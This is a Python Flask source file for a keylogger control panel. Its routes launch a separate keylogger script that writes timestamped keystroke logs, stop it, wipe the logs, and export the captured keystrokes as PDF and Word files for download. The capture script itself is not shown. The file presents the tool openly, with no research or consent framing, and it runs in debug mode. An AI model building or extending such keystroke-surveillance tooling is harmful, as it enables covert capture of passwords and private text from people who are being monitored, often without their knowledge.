# app.py
from flask import Flask, render_template, jsonify, send_file, request
import subprocess
import os
from datetime import datetime

app = Flask(__name__)
keylogger_process = None
log_dir = "logs"
current_log_file = None

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start')
def start():
    global keylogger_process, current_log_file
    if not keylogger_process:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        current_log_file = os.path.join(log_dir, f"keylog_{timestamp}.txt")
        keylogger_process = subprocess.Popen(["python", "keylogger.py", current_log_file])
        return jsonify(success=True)
    return jsonify(success=False)

@app.route('/stop')
def stop():
    global keylogger_process
    if keylogger_process:
        keylogger_process.terminate()
        keylogger_process = None
        return jsonify(success=True)
    return jsonify(success=False)

@app.route('/clear_logs')
def clear_logs():
    try:
        for file in os.listdir(log_dir):
            file_path = os.path.join(log_dir, file)
            if os.path.isfile(file_path):
                os.remove(file_path)
        return jsonify(success=True)
    except Exception as e:
        print(f"Error clearing logs: {str(e)}")
        return jsonify(success=False)

@app.route('/export')
def export():
    if current_log_file:
        subprocess.run(["python", "export_logs.py", current_log_file])
    return jsonify(success=True)

@app.route('/download_pdf')
def download_pdf():
    return send_file("keylog.pdf", as_attachment=True)

@app.route('/download_word')
def download_word():
    return send_file("keylog.docx", as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True)
